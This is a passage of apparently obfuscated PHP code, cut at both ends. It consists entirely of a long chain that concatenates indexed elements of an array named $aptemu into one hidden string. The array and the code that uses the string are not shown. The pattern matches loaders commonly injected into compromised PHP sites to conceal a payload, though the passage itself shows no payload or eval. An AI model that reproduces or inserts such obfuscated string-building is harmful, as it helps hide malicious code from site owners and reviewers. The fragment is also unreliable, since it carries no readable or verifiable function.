ptemu[77].$aptemu[195].$aptemu[71].$aptemu[10].$aptemu[14].$aptemu[67].$aptemu[95].$aptemu[72].$aptemu[33].$aptemu[132].$aptemu[72].$aptemu[14].$aptemu[81].$aptemu[27].$aptemu[86].$aptemu[94].$aptemu[145].$aptemu[62].$aptemu[17].$aptemu[8].$aptemu[20].$aptemu[26].$aptemu[243].$aptemu[27].$aptemu[38].$aptemu[40].$aptemu[77].$aptemu[23].$aptemu[86].$aptemu[19].$aptemu[23].$aptemu[49].$aptemu[9].$aptemu[89].$aptemu[5].$aptemu[8].$aptemu[8].$aptemu[71].$aptemu[22].$aptemu[75].$aptemu[13].$aptemu[8].$aptemu[19].$aptemu[67].$aptemu[27].$aptemu[51].$aptemu[62].$aptemu[34].$aptemu[83].$aptemu[22].$aptemu[22].$aptemu[0].$aptemu[61].$aptemu[17].$aptemu[7].$aptemu[151].$aptemu[67].$aptemu[49].$aptemu[78].$aptemu[83].$aptemu[14].$aptemu[195].$aptemu[15].$aptemu[66].$aptemu[67].$aptemu[55].$aptemu[34].$aptemu[5].$aptemu[94].$aptemu[5].$aptemu[52].$aptemu[29].$aptemu[7].$aptemu[160].$aptemu[9].$aptemu[61].$aptemu[109].$aptemu[195].$aptemu[81].$aptemu[77].$aptemu[61].$aptemu[11].$aptemu[44].$aptemu[23].$aptemu[71].$aptemu[15].$aptemu[15].$aptemu[81].$aptemu[22].$aptemu[17].$aptemu[6].$aptemu[145].$aptemu[109].$aptemu[15].$aptemu[77].$aptemu[55].$aptemu[86].$aptemu[29].$aptemu[15].$aptemu[72].$aptemu[34].$aptemu[0].$aptemu[23].$aptemu[33].$aptemu[25].$aptemu[86].$aptemu[40].$aptemu[0].$aptemu[62].$aptemu[82].$aptemu[55].$aptemu[151].$aptemu[195].$aptemu[0].$aptemu[12].$aptemu[8].$aptemu[23].$aptemu[3].$aptemu[71].$aptemu[83].$aptemu[49].$aptemu[86].$aptemu[126].$aptemu[132].$aptemu[12].$aptemu[33].$aptemu[82].$aptemu[25].$aptemu[6].$aptemu[7].$aptemu[62].$aptemu[66].$aptemu[4].$aptemu[15].$aptemu[71].$aptemu[18].$aptemu[27].$aptemu[82].$aptemu[11].$aptemu[44].$aptemu[67].$aptemu[55].$aptemu[126].$aptemu[9].$aptemu[126].$aptemu[195].$aptemu[3].$aptemu[77].$aptemu[62].$aptemu[13].$aptemu[95].$aptemu[89].$aptemu[29].$aptemu[126].$aptemu[66].$aptemu[2].$aptemu[126].$aptemu[26].$aptemu[18].$aptemu[49].$aptemu[23].$aptemu[14].$aptemu[49].$aptemu[25].$aptemu[81].$aptemu[151].$aptemu[66].$aptemu[55].$aptemu[14].$aptemu[27].$aptemu[109].$aptemu[34].$aptemu[165].$aptemu[61].$aptemu[66].$aptemu[15].$aptemu[81].$aptemu[15].$aptemu[1].$aptemu[81].$aptemu[7].$aptemu[34].$aptemu[14].$aptemu[4].$aptemu[67].$aptemu[51].$aptemu[26].$aptemu[6].$aptemu[23].$aptemu[83].$aptemu[126].$aptemu[160].$aptemu[23].$aptemu[55].$aptemu[78].$aptemu[95].$aptemu[6].$aptemu[12].$aptemu[12].$aptemu[25].$aptemu[71].$aptemu[174].$aptemu[15].$aptemu[66].$aptemu[5].$aptemu[160].$aptemu[14].$aptemu[165].$aptemu[66].$aptemu[51].$aptemu[51].$aptemu[126].$aptemu[21].$aptemu[51].$aptemu[1].$aptemu[66].$aptemu[44].$aptemu[12].$aptemu[15].$aptemu[9].$aptemu[22].$aptemu[2].$aptemu[72].$aptemu[11].$aptemu[132].$aptemu[21].$aptemu[78].$aptemu[36].$aptemu[34].$aptemu[20].$aptemu[160].$aptemu[3].$aptemu[83].$aptemu[132].$aptemu[67].$aptemu[22].$aptemu[27].$aptemu[83].$aptemu[40].$aptemu[12].$aptemu[9].$aptemu[145].$aptemu[26].$aptemu[15].$aptemu[0].$aptemu[29].$aptemu[12].$aptemu[8].$aptemu[5].$aptemu[81].$aptemu[78].$aptemu[62].$aptemu[8].$aptemu[243].$aptemu[86].$aptemu[17].$aptemu[3].$aptemu[48].$aptemu[62].$aptemu[14].$aptemu[243].$aptemu[72].$aptemu[94].$aptemu[27].$aptemu[94].$aptemu[18].$aptemu[151].$aptemu[62].$aptemu[15].$aptemu[145].$aptemu[243].$aptemu[83].$aptemu[19].$aptemu[243].$aptemu[81].$aptemu[132].$aptemu[126].$aptemu[81].$aptemu[15].$aptemu[71].$aptemu[109].$aptemu[8].$aptemu[27].$aptemu[86].$aptemu[145].$aptemu[34].$aptemu[7].$aptemu[61].$aptemu[95].$aptemu[195].$aptemu[145].$aptemu[23].$aptemu[26].$aptemu[2].$aptemu[174].$aptemu[10].$aptemu[71].$aptemu[52].$aptemu[51].$aptemu[23].$aptemu[44].$aptemu[29].$aptemu[81].$aptemu[151].$aptemu[15].$aptemu[14].$aptemu[14].$aptemu[145].$aptemu[38].$aptemu[6].$aptemu[36].$aptemu[22].$aptemu[10].$aptemu[89].$aptemu[195].$aptemu[36].$aptemu[34].$aptemu[89].$aptemu[48].$aptemu[83].$aptemu[25].$aptemu[109].$aptemu[36].$aptemu[72].$aptemu[62].$aptemu[3].$aptemu[7].$aptemu[22].$aptemu[132].$aptemu[18].$aptemu[8].$aptemu[132].$aptemu[49].$aptemu[13].$aptemu[81].$aptemu[7].$aptemu[174].$aptemu[17].$aptemu[23].$aptemu[38].$aptemu[78].$aptemu[174].$aptemu[71].$aptemu[132].$aptemu[7].$aptemu[132].$aptemu[21].$aptemu[3].$aptemu[34].$aptemu[40].$aptemu[15].$aptemu[52].$aptemu[20].$aptemu[36].$aptemu[8].$aptemu[12].$aptemu[9].$aptemu[9].$aptemu[86].$aptemu[243].$aptemu[160].$aptemu[67].$aptemu[29].$aptemu[19].$aptemu[5].$aptemu[40].$aptemu[126].$aptemu[33].$aptemu[8].$aptemu[78].$aptemu[44].$aptemu[12].$aptemu[51].$aptemu[40].$aptemu[61].$aptemu[33].$aptemu[44].$aptemu[40].$aptemu[151].$aptemu[2].$aptemu[72].$aptemu[27].$aptemu[15].$aptemu[26].$aptemu[4].$aptemu[195].$aptemu[40].$aptemu[82].$aptemu[95].$aptemu[29].$aptemu[33].$aptemu[21].$aptemu[62].$aptemu[78].$aptemu[44].$aptemu[21].$aptemu[62].$aptemu[75].$aptemu[82].$aptemu[83].$aptemu[52].$aptemu[78].$aptemu[19].$aptemu[12].$aptemu[94].$aptemu[151].$aptemu[23].$aptemu[126].$aptemu[151].$aptemu[27].$aptemu[174].$aptemu[22].$aptemu[67].$aptemu[19].$aptemu[1].$aptemu[33].$aptemu[19].$aptemu[243].$aptemu[19].$aptemu[6].$aptemu[21].$aptemu[12].$aptemu[20].$aptemu[51].$aptemu[77].$aptemu[38].$aptemu[55].$aptemu[7].$aptemu[21].$aptemu[13].$aptemu[126].$aptemu[62].$aptemu[33].$aptemu[0].$aptemu[174].$aptemu[145].$aptemu[243].$aptemu[27].$aptemu[15].$aptemu[75].$aptemu[1].$aptemu[44].$aptemu[23].$aptemu[145].$aptemu[12].$aptemu[151].$aptemu[5].$aptemu[77].$aptemu[61].$aptemu[7].$aptemu[25].$aptemu[62].$aptemu[22].$aptemu[4].$aptemu[3].$aptemu[243].$aptemu[12].$aptemu[55].$aptemu[52].$aptemu[72].$aptemu[66].$aptemu[6].$aptemu[81].$aptemu[11].$aptemu[243].$aptemu[18].$aptemu[61].$aptemu[4].$aptemu[23].$aptemu[0].$aptemu[78].$aptemu[243].$aptemu[29].$aptemu[89].$aptemu[18].$aptemu[40].$aptemu[94].$aptemu[23].$aptemu[132].$aptemu[160].$aptemu[21].$aptemu[3].$aptemu[82].$aptemu[160].$aptemu[75].$aptemu[2].$aptemu[23].$aptemu[40].$aptemu[243].$aptemu[89].$aptemu[18].$aptemu[21].$aptemu[15].$aptemu[83].$aptemu[27].$aptemu[7].$aptemu[13].$aptemu[72].$aptemu[3].$aptemu[0].$aptemu[33].$aptemu[67].$aptemu[55].$aptemu[12].$aptemu[71].$aptemu[243].$aptemu[38].$aptemu[160].$aptemu[49].$aptemu[7].$aptemu[75].$aptemu[126].$aptemu[27].$aptemu[17].$aptemu[2].$aptemu[195].$aptemu[26].$aptemu[66].$aptemu[38].$aptemu[5].$aptemu[81].$aptemu[20].$aptemu[10].$aptemu[62].$aptemu[95].$aptemu[243].$aptemu[33].$aptemu[132].$aptemu[38].$aptemu[81].$aptemu[0].$aptemu[14].$aptemu[20].$aptemu[25].$aptemu[21].$aptemu[94].$aptemu[75].$aptemu[62].$aptemu[86].$aptemu[71].$aptemu[55].$aptemu[36].$aptemu[21].$aptemu[9].$aptemu[2].$aptemu[8].$aptemu[26].$aptemu[44].$aptemu[36].$aptemu[165].$aptemu[61].$aptemu[19].$aptemu[5].$aptemu[38].$aptemu[29].$aptemu[86].$aptemu[21].$aptemu[4].$aptemu[1].$aptemu[18].$aptemu[9].$aptemu[66].$aptemu[82].$aptemu[40].$aptemu[3].$aptemu[195].$aptemu[27].$aptemu[27].$aptemu[81].$aptemu[243].$aptemu[86].$aptemu[0].$aptemu[55].$aptemu[4].$aptemu[71].$aptemu[109].$aptemu[55].$aptemu[1].$aptemu[26].$aptemu[26].$aptemu[126].$aptemu[81].$aptemu[13].$aptemu[82].$aptemu[151].$aptemu[14].$aptemu[34].$aptemu[75].$aptemu[195].$aptemu[165].$aptemu[71].$aptemu[27].$aptemu[195].$aptemu[89].$aptemu[7].$aptemu[25].$aptemu[5].$aptemu[165].$aptemu[81].$aptemu[126].$aptemu[67].$aptemu[6].$aptemu[11].$aptemu[82].$aptemu[3].$aptemu[81].$aptemu[243].$aptemu[29].$aptemu[195].$aptemu[27].$aptemu[44].$aptemu[25].$aptemu[55].$aptemu[61].$aptemu[55].$aptemu[4].$aptemu[13].$aptemu[62].$aptemu[6].$aptemu[71].$aptemu[109].$aptemu[10].$aptemu[52].$aptemu[0].$aptemu[5].$aptemu[109].$aptemu[160].$aptemu[109].$aptemu[3].$aptemu[23].$aptemu[48].$aptemu[151].$aptemu[55].$aptemu[2].$aptemu[44].$aptemu[66].$aptemu[243].$aptemu[72].$aptemu[6].$aptemu[23].$aptemu[8].$aptemu[51].$aptemu[2].$aptemu[95].$aptemu[62].$aptemu[23].$aptemu[61].$aptemu[95].$aptemu[14].$aptemu[86].$aptemu[22].$aptemu[51].$aptemu[243].$aptemu[7].$aptemu[19].$aptemu[82].$aptemu[89].$aptemu[71].$aptemu[34].$aptemu[49].$aptemu[48].$aptemu[66].$aptemu[20].$aptemu[51].$aptemu[82].$aptemu[49].$aptemu[19].$aptemu[75].$aptemu[22].$aptemu[7].$aptemu[3].$aptemu[27].$aptemu[71].$aptemu[18].$aptemu[160].$aptemu[17].$aptemu[36].$aptemu[83].$aptemu[83].$aptemu[66].$aptemu[5].$aptemu[23].$aptemu[62].$aptemu[13].$aptemu[126].$aptemu[23].$aptemu[72].$aptemu[55].$aptemu[151].$aptemu[66].$aptemu[13].$aptemu[55].$aptemu[33].$aptemu[72].$aptemu[11].$aptemu[34].$aptemu[78].$aptemu[10].$aptemu[3].$aptemu[9].$aptemu[27].$aptemu[18].$aptemu[25].$aptemu[151].$aptemu[195].$aptemu[3].$aptemu[95].$aptemu[174].$aptemu[195].$aptemu[21].$aptemu[23].$aptemu[14].$aptemu[44].$aptemu[82].$aptemu[55].$aptemu[86].$aptemu[34].$aptemu[38].$aptemu[40].$aptemu[89].$aptemu[174].$aptemu[4].$aptemu[17].$aptemu[165].$aptemu[145].$aptemu[132].$aptemu[17].$aptemu[15].$aptemu[151].$aptemu[49].$aptemu[75].$aptemu[71].$aptemu[40].$aptemu[48].$aptemu[151].$aptemu[34].$aptemu[6].$aptemu[61].$aptemu[72].$aptemu[160].$aptemu[66].$aptemu[160].$aptemu[20].$aptemu[18].$aptemu[27].$aptemu[82].$aptemu[81].$aptemu[6].$aptemu[51].$aptemu[55].$aptemu[11].$aptemu[20].$aptemu[81].$aptemu[38].$aptemu[66].$aptemu[3].$aptemu[25].$aptemu[29].$aptemu[2].$aptemu[13].$aptemu[15].$aptemu[3].$aptemu[67].$aptemu[67].$aptemu[10].$aptemu[25].$aptemu[95].$aptemu[86].$aptemu[78].$aptemu[17].$aptemu[72].$aptemu[52].$aptemu[174].$aptemu[23].$aptemu[11].$aptemu[132].$aptemu[40].$aptemu[52].$aptemu[34].$aptemu[61].$aptemu[3].$aptemu[10].$aptemu[6].$aptemu[160].$aptemu[26].$aptemu[77].$aptemu[17].$aptemu[12].$aptemu[66].$aptemu[71].$aptemu[52].$aptemu[1].$aptemu[17].$aptemu[23].$aptemu[18].$aptemu[109].$aptemu[94].$aptemu[174].$aptemu[18].$aptemu[18].$aptemu[33].$aptemu[66].$aptemu[78].$aptemu[14].$aptemu[82].$aptemu[160].$aptemu[86].$aptemu[66].$aptemu[89].$aptemu[126].$aptemu[29].$aptemu[195].$aptemu[61].$aptemu[0].$aptemu[25].$aptemu[72].$aptemu[10].$aptemu[8].$aptemu[55].$aptemu[25].$aptemu[7].$aptemu[67].$aptemu[44].$aptemu[1].$aptemu[89].$aptemu[75].$aptemu[25].$aptemu[3].$aptemu[109].$aptemu[11].$aptemu[52].$aptemu[9].$aptemu[151].$aptemu[3].$aptemu[132].$aptemu[44].$aptemu[0].$aptemu[2].$aptemu[5].$aptemu[8].$aptemu[17].$aptemu[15].$aptemu[62].$aptemu[83].$aptemu[8].$aptemu[44].$aptemu[145].$aptemu[7].$aptemu[15].$aptemu[20].$aptemu[33].$aptemu[94].$aptemu[145].$aptemu[151].$aptemu[195].$aptemu[4].$aptemu[243].$aptemu[8].$aptemu[49].$aptemu[82].$aptemu[61].$aptemu[72].$aptemu[61].$aptemu[33].$aptemu[82].$aptemu[151].$aptemu[7].$aptemu[21].$aptemu[34].$aptemu[62].$aptemu[25].$aptemu[165].$aptemu[160].$aptemu[145].$aptemu[14].$aptemu[95].$aptemu[22].$aptemu[22].$aptemu[174].$aptemu[0].$aptemu[5].$aptemu[67].$aptemu[13].$aptemu[72].$aptemu[243].$aptemu[25].$aptemu[95].$aptemu[89].$aptemu[174].$aptemu[17].$aptemu[195].$aptemu[12].$aptemu[17].$aptemu[71].$aptemu[51].$aptemu[15].$aptemu[195].$aptemu[81].$aptemu[66].$aptemu[38].$aptemu[89].$aptemu[12].$aptemu[8].$aptemu[3].$aptemu[25].$aptemu[19].$aptemu[51].$aptemu[94].$aptemu[27].$aptemu[17].$aptemu[18].$aptemu[78].$aptemu[25].$aptemu[126].$aptemu[77].$aptemu[55].$aptemu[61].$aptemu[5].$aptemu[14].$aptemu[49].$aptemu[17].$aptemu[40].$aptemu[132].$aptemu[1].$aptemu[27].$aptemu[94].$aptemu[195].$aptemu[75].$aptemu[0].$aptemu[243].$aptemu[22].$aptemu[0].$aptemu[38].$aptemu[36].$aptemu[10].$aptemu[62].$aptemu[18].$aptemu[71].$aptemu[81].$aptemu[38].$aptemu[34].$aptemu[20].$aptemu[22].$aptemu[62].$aptemu[26].$aptemu[5].$aptemu[23].$aptemu[55].$aptemu[77].$aptemu[89].$aptemu[3].$aptemu[5].$aptemu[126].$aptemu[15].$aptemu[82].$aptemu[8].$aptemu[9].$aptemu[72].$aptemu[0].$aptemu[19].$aptemu[38].$aptemu[15].$aptemu[17].$aptemu[195].$aptemu[71].$aptemu[77].$aptemu[165].$aptemu[195].$aptemu[243].$aptemu[14].$aptemu[15].$aptemu[14].$aptemu[17].$aptemu[83].$aptemu[0].$aptemu[95].$aptemu[195].$aptemu[165].$aptemu[27].$aptemu[55].$aptemu[17].$aptemu[1].$aptemu[21].$aptemu[34].$aptemu[0].$aptemu[77].$aptemu[44].$aptemu[75].$aptemu[61].$aptemu[243].$aptemu[109].$aptemu[78].$aptemu[22].$aptemu[3].$aptemu[66].$aptemu[48].$aptemu[9].$aptemu[4].$aptemu[20].$aptemu[51].$aptemu[21].$aptemu[78].$aptemu[12].$aptemu[195].$aptemu[17].$aptemu[10].$aptemu[174].$aptemu[13].$aptemu[62].$aptemu[36].$aptemu[13].$aptemu[4].$aptemu[14].$aptemu[126].$aptemu[165].$aptemu[51].$aptemu[243].$aptemu[7].$aptemu[40].$aptemu[82].$aptemu[22].$aptemu[33].$aptemu[5].$aptemu[55].$aptemu[20].$aptemu[14].$aptemu[36].$aptemu[52].$aptemu[15].$aptemu[94].$aptemu[14].$aptemu[21].$aptemu[109].$aptemu[23].$aptemu[126].$aptemu[10].$aptemu[8].$aptemu[4].$aptemu[9].$aptemu[27].$aptemu[7].$aptemu[55].$aptemu[61].$aptemu[19].$aptemu[44].$aptemu[38].$aptemu[19].$aptemu[19].$aptemu[71].$aptemu[20].$aptemu[8].$aptemu[86].$aptemu[67].$aptemu[1].$aptemu[4].$aptemu[4].$aptemu[11].$aptemu[81].$aptemu[7].$aptemu[6].$aptemu[12].$aptemu[174].$aptemu[17].$aptemu[126].$aptemu[40].$aptemu[18].$aptemu[26].$aptemu[3].$aptemu[195].$aptemu[48].$aptemu[23].$aptemu[66].$aptemu[52].$aptemu[25].$aptemu[34].$aptemu[174].$aptemu[48].$aptemu[132].$aptemu[52].$aptemu[2].$aptemu[77].$aptemu[132].$aptemu[1].$aptemu[34].$aptemu[126].$aptemu[9].$aptemu[6].$aptemu[8].$aptemu[1].$aptemu[48].$aptemu[7].$aptemu[165].$aptemu[62].$aptemu[19].$aptemu[44].$aptemu[0].$aptemu[5].$aptemu[151].$aptemu[9].$aptemu[21].$aptemu[51].$aptemu[75].$aptemu[49].$aptemu[75].$aptemu[51].$aptemu[12].$aptemu[2].$aptemu[78].$aptemu[11].$aptemu[40].$aptemu[14].$aptemu[49].$aptemu[22].$aptemu[126].$aptemu[9].$aptemu[40].$aptemu[126].$aptemu[15].$aptemu[83].$aptemu[81].$aptemu[23].$aptemu[52].$aptemu[126].$aptemu[82].$aptemu[18].$aptemu[3].$aptemu[10].$aptemu[0].$aptemu[174].$aptemu[18].$aptemu[77].$aptemu[1].$aptemu[52].$aptemu[145].$aptemu[3].$aptemu[61].$aptemu[8].$aptemu[109].$aptemu[195].$aptemu[174].$aptemu[67].$aptemu[9].$aptemu[151].$aptemu[66].$aptemu[33].$aptemu[15].$aptemu[49].$aptemu[23].$aptemu[51].$aptemu[49].$aptemu[52].$aptemu[83].$aptemu[29].$aptemu[27].$aptemu[71].$aptemu[25].$aptemu[40].$aptemu[17].$aptemu[40].$aptemu[77].$aptemu[17].$aptemu[11].$aptemu[67].$aptemu[9].$aptemu[44].$aptemu[3].$aptemu[132].$aptemu[82].$aptemu[8].$aptemu[4].$aptemu[18].$aptemu[82].$aptemu[17].$aptemu[3].$aptemu[14].$aptemu[44].$aptemu[243].$aptemu[15].$aptemu[151].$aptemu[25].$aptemu[18].$aptemu[3].$aptemu[20].$aptemu[48].$aptemu[18].$aptemu[25].$aptemu[132].$aptemu[14].$aptemu[11].$aptemu[36].$aptemu[86].$aptemu[160].$aptemu[160].$aptemu[49].$aptemu[25].$aptemu[8].$aptemu[48].$aptemu[11].$aptemu[15].$aptemu[33].$aptemu[75].$aptemu[18].$aptemu[12].$aptemu[86].$aptemu[195].$aptemu[48].$aptemu[5].$aptemu[17].$aptemu[51].$aptemu[62].$aptemu[71].$aptemu[8].$aptemu[27].$aptemu[94].$aptemu[12].$aptemu[82].$aptemu[40].$aptemu[14].$aptemu[11].$aptemu[1].$aptemu[151].$aptemu[4].$aptemu[12].$aptemu[77].$aptemu[38].$aptemu[14].$aptemu[89].$aptemu[36].$aptemu[55].$aptemu[44].$aptemu[27].$aptemu[81].$aptemu[14].$aptemu[14].$aptemu[22].$aptemu[19].$aptemu[62].$aptemu[9].$aptemu[165].$aptemu[174].$aptemu[82].$aptemu[66].$aptemu[160].$aptemu[44].$aptemu[3].$aptemu[34].$aptemu[174].$aptemu[67].$aptemu[33].$aptemu[82].$aptemu[165].$aptemu[1].$aptemu[71].$aptemu[22].$aptemu[14].$aptemu[5].$aptemu[8].$aptemu[61].$aptemu[95].$aptemu[12].$aptemu[34].$aptemu[86].$aptemu[10].$aptemu[29].$aptemu[132].$aptemu[49].$aptemu[82].$aptemu[2].$aptemu[0].$aptemu[151].$aptemu[25].$aptemu[8].$aptemu[51].$aptemu[174].$aptemu[9].$aptemu[151].$aptemu[89].$aptemu[48].$aptemu[25].$aptemu[82].$aptemu[126].$aptemu[19].$aptemu[95].$aptemu[2].$aptemu[20].$aptemu[49].$aptemu[195].$aptemu[78].$aptemu[160].$aptemu[55].$aptemu[14].$aptemu[77].$aptemu[49].$aptemu[165].$aptemu[36].$aptemu[26].$aptemu[71].$aptemu[109].$aptemu[0].$aptemu[174].$aptemu[52].$aptemu[165].$aptemu[174].$aptemu[174].$aptemu[21].$aptemu[49].$aptemu[82].$aptemu[151].$aptemu[27].$aptemu[126].$aptemu[160].$aptemu[4].$aptemu[77].$aptemu[51].$aptemu[33].$aptemu[14].$aptemu[89].$aptemu[5].$aptemu[75].$aptemu[109].$aptemu[21].$aptemu[66].$aptemu[48].$aptemu[7].$aptemu[20].$aptemu[95].$aptemu[38].$aptemu[95].$aptemu[195].$aptemu[22].$aptemu[14].$aptemu[3].$aptemu[72].$aptemu[72].$aptemu[14].$aptemu[151].$aptemu[55].$aptemu[94].$aptemu[6].$aptemu[67].$aptemu[6].$aptemu[25].$aptemu[22].$aptemu[25].$aptemu[36].$aptemu[29].$aptemu[3].$aptemu[151].$aptemu[62].$aptemu[49].$aptemu[66].$aptemu[95].$aptemu[18].$aptemu[40].$aptemu[17].$aptemu[71].$aptemu[94].$aptemu[20].$aptemu[83].$aptemu[20].$aptemu[34].$aptemu[89].$aptemu[62].$aptemu[160].$aptemu[33].$aptemu[12].$aptemu[82].$aptemu[23].$aptemu[23].$aptemu[15].$aptemu[7].$aptemu[78].$aptemu[49].$aptemu[29].$aptemu[40].$aptemu[19].$aptemu[66].$aptemu[19].$aptemu[49].$aptemu[44].$aptemu[151].$aptemu[1].$aptemu[66].$aptemu[49].$aptemu[15].$aptemu[15].$aptemu[18].$aptemu[109].$aptemu[109].$aptemu[17].$aptemu[81].$aptemu[6].$aptemu[25].$aptemu[83].$aptemu[67].$aptemu[15].$aptemu[27].$aptemu[5].$aptemu[38].$aptemu[132].$aptemu[26].$aptemu[4].$aptemu[94].$aptemu[94].$aptemu[95].$aptemu[55].$aptemu[243].$aptemu[81].$aptemu[14].$aptemu[71].$aptemu[94].$aptemu[67].$aptemu[13].$aptemu[0].$aptemu[11].$aptemu[18].$aptemu[94].$aptemu[17].$aptemu[23].$aptemu[78].$aptemu[14].$aptemu[5].$aptemu[17].$aptemu[95].$aptemu[12].$aptemu[78].$aptemu[23].$aptemu[34].$aptemu[21].$aptemu[89].$aptemu[9].$aptemu[38].$aptemu[81].$aptemu[15].$aptemu[75].$aptemu[0].$aptemu[33].$aptemu[15].$aptemu[6].$aptemu[7].$aptemu[71].$aptemu[44].$aptemu[67].$aptemu[1].$aptemu[243].$aptemu[25].$aptemu[160].$aptemu[40].$aptemu[5].$aptemu[77].$aptemu[7].$aptemu[11].$aptemu[14].$aptemu[61].$aptemu[81].$aptemu[12].$aptemu[23].$aptemu[9].$aptemu[13].$aptemu[75].$aptemu[132].$aptemu[23].$aptemu[19].$aptemu[48].$aptemu[26].$aptemu[0].$aptemu[62].$aptemu[78].$aptemu[23].$aptemu[40].$aptemu[95].$aptemu[18].$aptemu[7].$aptemu[25].$aptemu[22].$aptemu[82].$aptemu[126].$aptemu[44].$aptemu[86].$aptemu[61].$aptemu[126].$aptemu[61].$aptemu[89].$aptemu[2].$aptemu[61].$aptemu[40].$aptemu[12].$aptemu[51].$aptemu[13].$aptemu[89].$aptemu[7].$aptemu[89].$aptemu[3].$aptemu[62].$aptemu[6].$aptemu[51].$aptemu[165].$aptemu[4].$aptemu[48].$aptemu[132].$aptemu[160].$aptemu[8].$aptemu[82].$aptemu[89].$aptemu[52].$aptemu[38].$aptemu[27].$aptemu[0].$aptemu[49].$aptemu[33].$aptemu[20].$aptemu[12].$aptemu[89].$aptemu[15].$aptemu[8].$aptemu[8].$aptemu[23].$aptemu[132].$aptemu[78].$aptemu[78].$aptemu[34].$aptemu[83].$aptemu[40].$aptemu[86].$aptemu[12].$aptemu[66].$aptemu[12].$aptemu[82].$aptemu[8].$aptemu[174].$aptemu[52].$aptemu[1].$aptemu[5].$aptemu[89].$aptemu[36].$aptemu[51].$aptemu[82].$aptemu[165].$aptemu[10].$aptemu[6].$aptemu[49].$aptemu[89].$aptemu[40].$aptemu[78].$aptemu[0].$aptemu[89].$aptemu[29].$aptemu[195].$aptemu[21].$aptemu[21].$aptemu[23].$aptemu[126].$aptemu[109].$aptemu[38].$aptemu[15].$aptemu[8].$aptemu[26].$aptemu[78].$aptemu[174].$aptemu[8].$aptemu[78].$aptemu[6].$aptemu[48].$aptemu[34].$aptemu[10].$aptemu[11].$aptemu[8].$aptemu[55].$aptemu[78].$aptemu[151].$aptemu[10].$aptemu[77].$aptemu[66].$aptemu[22].$aptemu[126].$aptemu[195].$aptemu[8].$aptemu[12].$aptemu[243].$aptemu[174].$aptemu[55].$aptemu[78].$aptemu[49].$aptemu[19].$aptemu[1].$aptemu[83].$aptemu[165].$aptemu[160].$aptemu[66].$aptemu[77].$aptemu[20].$aptemu[195].$aptemu[77].$aptemu[9].$aptemu[2].$aptemu[48].$aptemu[145].$aptemu[71].$aptemu[48].$aptemu[2].$aptemu[15].$aptemu[9].$aptemu[21].$aptemu[27].$aptemu[29].$aptemu[10].$aptemu[26].$aptemu[109].$aptemu[38].$aptemu[51].$aptemu[126].$aptemu[151].$aptemu[13].$aptemu[71].$aptemu[5].$aptemu[75].$aptemu[14].$aptemu[18].$aptemu[21].$aptemu[11].$aptemu[81].$aptemu[165].$aptemu[18].$aptemu[1].$aptemu[33].$aptemu[29].$aptemu[52].$aptemu[20].$aptemu[195].$aptemu[61].$aptemu[40].$aptemu[11].$aptemu[109].$aptemu[7].$aptemu[82].$aptemu[9].$aptemu[151].$aptemu[174].$aptemu[195].$aptemu[6].$aptemu[21].$aptemu[22].$aptemu[75].$aptemu[29].$aptemu[20].$aptemu[94].$aptemu[5].$aptemu[160].$aptemu[14].$aptemu[66].$aptemu[86].$aptemu[6].$aptemu[10].$aptemu[82].$aptemu[22].$aptemu[51].$aptemu[86].$aptemu[44].$aptemu[13].$aptemu[89].$aptemu[48].$aptemu[18].$aptemu[15].$aptemu[9].$aptemu[26].$aptemu[95].$aptemu[55].$aptemu[243].$aptemu[82].$aptemu[48].$aptemu[195].$aptemu[145].$aptemu[44].$aptemu[174].$aptemu[33].$aptemu[89].$aptemu[243].$aptemu[8].$aptemu[13].$aptemu[48].$aptemu[18].$aptemu[0].$aptemu[109].$aptemu[71].$aptemu[67].$aptemu[132].$aptemu[9].$aptemu[29].$aptemu[62].$aptemu[48].$aptemu[132].$aptemu[94].$aptemu[44].$aptemu[33].$aptemu[15].$aptemu[109].$aptemu[151].$aptemu[38].$aptemu[52].$aptemu[243].$aptemu[34].$aptemu[21].$aptemu[40].$aptemu[83].$aptemu[195].$aptemu[55].$aptemu[71].$aptemu[195].$aptemu[81].$aptemu[20].$aptemu[77].$aptemu[95].$aptemu[23].$aptemu[40].$aptemu[44].$aptemu[160].$aptemu[21].$aptemu[94].$aptemu[5].$aptemu[52].$aptemu[145].$aptemu[2].$aptemu[23].$aptemu[29].$aptemu[126].$aptemu[132].$aptemu[82].$aptemu[17].$aptemu[22].$aptemu[21].$aptemu[151].$aptemu[62].$aptemu[44].$aptemu[77].$aptemu[165].$aptemu[26].$aptemu[72].$aptemu[10].$aptemu[78].$aptemu[20].$aptemu[5].$aptemu[9].$aptemu[17].$aptemu[15].$aptemu[81].$aptemu[94].$aptemu[33].$aptemu[52].$aptemu[2].$aptemu[55].$aptemu[67].$aptemu[78].$aptemu[77].$aptemu[109].$aptemu[14].$aptemu[55].$aptemu[29].$aptemu[13].$aptemu[151].$aptemu[72].$aptemu[5].$aptemu[14].$aptemu[6].$aptemu[95].$aptemu[61].$aptemu[81].$aptemu[72].$aptemu[243].$aptemu[67].$aptemu[95].$aptemu[89].$aptemu[52].$aptemu[1].$aptemu[75].$aptemu[49].$aptemu[195].$aptemu[165].$aptemu[13].$aptemu[21].$aptemu[9].$aptemu[62].$aptemu[13].$aptemu[34].$aptemu[145].$aptemu[7].$aptemu[75].$aptemu[195].$aptemu[109].$aptemu[14].$aptemu[22].$aptemu[12].$aptemu[40].$aptemu[7].$aptemu[145].$aptemu[94].$aptemu[78].$aptemu[83].$aptemu[44].$aptemu[21].$aptemu[15].$aptemu[81].$aptemu[23].$aptemu[34].$aptemu[55].$aptemu[83].$aptemu[195].$aptemu[49].$aptemu[36].$aptemu[29].$aptemu[77].$aptemu[21].$aptemu[1].$aptemu[160].$aptemu[195].$aptemu[49].$aptemu[19].$aptemu[75].$aptemu[77].$aptemu[145].$aptemu[19].$aptemu[75].$aptemu[21].$aptemu[49].$aptemu[62].$aptemu[82].$aptemu[61].$aptemu[4].$aptemu[160].$aptemu[95].$aptemu[83].$aptemu[0].$aptemu[36].$aptemu[151].$aptemu[75].$aptemu[38].$aptemu[94].$aptemu[61].$aptemu[22].$aptemu[151].$aptemu[38].$aptemu[243].$aptemu[12].$aptemu[0].$aptemu[44].$aptemu[3].$aptemu[14].$aptemu[4].$aptemu[78].$aptemu[78].$aptemu[3].$aptemu[34].$aptemu[61].$aptemu[75].$aptemu[89].$aptemu[48].$aptemu[195].$aptemu[26].$aptemu[38].$aptemu[132].$aptemu[195].$aptemu[23].$aptemu[71].$aptemu[109].$aptemu[71].$aptemu[27].$aptemu[7].$aptemu[9].$aptemu[1].$aptemu[22].$aptemu[132].$aptemu[78].$aptemu[17].$aptemu[66].$aptemu[61].$aptemu[82].$